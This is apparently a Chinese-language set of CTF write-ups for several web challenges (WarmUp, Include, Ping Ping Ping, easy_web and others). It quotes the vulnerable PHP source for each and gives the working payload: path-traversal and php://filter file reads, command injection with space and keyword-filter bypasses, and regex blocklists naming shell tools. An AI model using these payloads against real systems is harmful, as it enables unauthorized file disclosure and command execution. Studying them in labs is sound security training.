## [HCTF 2018]WarmUp

HTML源码中可以看到提示：

![截屏2022-07-11 上午9.04.41](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-11 上午9.04.41.png)

访问后看到代码：

```php+HTML
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {//路径白名单验证
                return true;
            }

            $_page = mb_substr(//取问号之前的字符来验证白名单
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);//这一部分多了一次url解码，其他和上面一样
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])//验证白名单
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

根据代码，checkFile函数中只要又一次验证白名单通过就可以执行include，先看一下hint

![截屏2022-07-11 上午9.11.36](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-11 上午9.11.36.png)

路径中必须以 `hint.php?` 开头，那么如何构造才能include到flag呢?

然后这里需要理解一个知识点，include是按照最简的路径来的，因为要服务于include_once，require也是一样。最简路径（或者说唯一路径）是删除了不必经过的文件夹之后的路径，例如一个路径：`nonexistent/../../info.php`，进入nonexistent文件夹之后又回退到父级目录，那么它的唯一路径就是 `../info.php`。计算唯一路径，放进hashmap，能使include_once正常工作。例如下列代码只会运行一次info.php: 

```php
<?php
  
require('nonexistent/../../info.php');

require_once('../info.php');

?>
```

参考文章：

https://www.cnblogs.com/sooj/p/3184825.html

https://www.anquanke.com/post/id/213235

如果包含的路径中有不存在的文件夹，可以在后面用 `../` 将它"消去"，这样就是合法的路径了。

那么就可以在 `hint.php?` 后加一个 ` /` ，让它作为一个文件夹名，之后再用 `../` ，就是合法路径了。

Payload: `file=source.php?/../../../../../ffffllllaaaagggg`

## [极客大挑战 2019]Havefun

HTML源码中可以看到代码：

![截屏2022-07-11 上午11.48.14](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-11 上午11.48.14.png)

GET一个cat=dog的参数即可

Payload: `cat=dog`

## [ACTF2020 新生赛]Include

页面有个a标签tips，给了get参数名file。

用data和input发现被过滤了，先想着看源码，使用 `php://filter/read=convert.base64-encode/resource=index.php`

base64解码后，看到源码：

```php
<meta charset="utf8">
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")){
	exit('hacker!');
}
if($file){
	include($file);
}else{
	echo '<a href="?file=flag.php">tips</a>';
}
?>
```

似乎能执行代码的都被过滤了，但是filter能用。在当前目录下找到flag.php

Payload: `file=php://filter/read=convert.base64-encode/resource=flag.php`

## [极客大挑战 2019]Secret File

查看源码，发现一个a标签

![截屏2022-07-11 下午2.08.18](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-11 下午2.08.18.png)

跳转到action.php，但是页面最终停留在end.php。中间肯定经过了重定向，这里看浏览器的“网络”看不到，得用抓包软件抓。

<img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-11 下午2.12.51.png" alt="截屏2022-07-11 下午2.12.51" style="zoom:50%;" />

然后看到代码：

```php+HTML
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

是一个文件包含，但是要绕过waf。没过滤php封装，可以直接使用 `php://filter`

Payload: `file=php://filter/read=convert.base64-encode/resource=flag.php`

## [ACTF2020 新生赛]Exec

也许叫做命令行注入？

<img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-11 下午2.40.02.png" alt="截屏2022-07-11 下午2.40.02" style="zoom:50%;" />

找到flag cat一下即可

Payload: `||cat ../../../flag`

## [GXYCTF2019]Ping Ping Ping

body给的提示，ip通过get参数传入。传入ip=||cat flag.php 后，出来个这个，似乎是说不能有空格

![截屏2022-07-11 下午2.44.11](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-11 下午2.44.11.png)

用$IFS$1代替后发现flag也会被过滤，回到index看看源码

```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}
```

不熟悉没什么思路，看了别人wp后发现可以用变量来绕过。有点坑的是flag在注释里。

Payload: `ip=||a=g;cat$IFS$1fla$a.php`

## [安洵杯 2019]easy_web

cmd参数试了几个都被拦截了，img参数 `TmprMlpUWTBOalUzT0RKbE56QTJPRGN3` 依次经过base64-base64-hex解码后，是 `555.png` ，目测是读取本地文件，那么把 `index.php` 经过上面编码的逆过程后传入img参数，在body中就可以看到被base64编码过后的源码了

![截屏2022-07-13 上午10.40.55](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-13 上午10.40.55.png)

解码后得到index的源码：

```php+HTML
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {//可以看到是一个md5碰撞
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

md5碰撞就不多说了，重点是绕过waf，可以使用反斜杠 `\` 

![截屏2022-07-13 上午11.10.23](https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-13 上午11.10.23.png)

Payload: `&cmd=c\at /flag`